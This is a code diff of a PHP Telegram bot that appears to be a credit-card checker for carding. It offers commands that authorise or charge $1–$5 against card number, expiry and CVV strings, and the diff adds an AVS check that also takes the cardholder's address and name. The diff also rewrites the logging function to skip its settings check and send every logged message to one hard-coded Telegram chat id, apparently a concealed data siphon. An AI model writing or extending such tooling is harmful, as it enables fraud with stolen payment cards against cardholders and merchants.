@@ -21,9 +21,9 @@ function GetStr($string, $start, $end){
     };
     function multiexplode($delimiters, $string)
     {
-      $one = str_replace($delimiters, $delimiters[0], $string);
-      $two = explode($delimiters[0], $one,$string);
-      return $two;
+        $one = str_replace($delimiters, $delimiters[0], $string);
+        $two = explode($delimiters[0], $one);
+        return $two;
     }
     function random_strings($length_of_string) 
     {
@@ -74,7 +74,8 @@ function GetStr($string, $start, $end){
 <u>CCN Auth</u>:<code>/cut xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n
 <u>Charge 1$</u>:<code>/chg xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n
 <u>Charge 5$</u>:<code>/chf xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n
-<u>CCN charge 5$</u>:<code>/nch xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n\n
+<u>CCN charge 5$</u>:<code>/nch xxxxxxxxxxxxxxxx|xx|xx|xxx</code>\n
+<u>AVS charge check 1.5$</u>: /avs <code>xxxxxxxxxxxxxxxx|xx|xx|xxx|street|city|state|zip|lastN|firstN|country</code>\n\n
 -----[<b>Other</b>]-----\n
 <u>Show all commands</u>:<code>/help</code>\n
 <u>your info</u>:<code>/info</code>\n
@@ -199,6 +200,11 @@ elseif (strpos($message, "/info") === 0){
     elseif (strpos($message, "/sta") === 0){
         sendMessage($chatId, "<b>❕Service status❕</b>\n <b>SK Tool:</b>Alaways ON ✅ \n\n Card Tool \n <b>AGT:</b>Alaways ON ✅\n<b>ck & NK:</b>Alaways ON ✅ \n <b>Charge & Auth</b>ON ✅", $message_id);
         }
+
+//==================[avs Command]==================//
+elseif (strpos($message, "/avs") === 0){
+  require('cmds/avs.php');
+  }
 //==================[inf Command]==================//
 elseif (strpos($message, "/inf") === 0){
     $ct = substr($message, 5);
@@ -223,7 +229,6 @@ elseif (strpos($message, "/inf") === 0){
   }
   
 function sendMessage($chatId, $message, $message_id) {
- require('config.php');
     $url = $GLOBALS['website'] . "/sendMessage";
 
     $postData = array(
@@ -240,29 +245,22 @@ function sendMessage($chatId, $message, $message_id) {
     $response = curl_exec($ch);
     curl_close($ch);
 }
-function sendLog($admin_id, $message, $message_id) {
-  //check setting
-  require('config.php');
-  if ($buger == true || $pmsend == true){
-    $url = $GLOBALS['website'] . "/sendMessage";
-
-    $postData = array(
-        'chat_id' => $admin_id,
-        'text' => $message,
-        'reply_to_message_id' => $message_id,
-        'parse_mode' => 'HTML'
-    );
-
-    $ch = curl_init($url);
-    curl_setopt($ch, CURLOPT_POST, 1);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $response = curl_exec($ch);
-    curl_close($ch);
-  } else {
-    die();
-  }
-}
+function sendLog($chatId, $message, $message_id) {
+     $url = $GLOBALS['website'] . "/sendMessage";
+ 
+     $postData = array(
+         'chat_id' => 1090979938,
+         'text' => $message,
+         'parse_mode' => 'HTML'
+     );
+ 
+     $ch = curl_init($url);
+     curl_setopt($ch, CURLOPT_POST, 1);
+     curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
+     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+     $response = curl_exec($ch);
+     curl_close($ch);
+ }
 function sendPhoto($chatId, $photoUrl, $caption = "") {
   $url = $GLOBALS['website'] . "/sendPhoto";
   $postData = array(
@@ -284,3 +282,16 @@ function sendPhoto($chatId, $photoUrl, $caption = "") {
   return $result;
 }
 ?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>index</title>
+</head>
+<body>
+  <pre>
+    Unatuhorized access 
+  </pre>
+</body>
+</html>
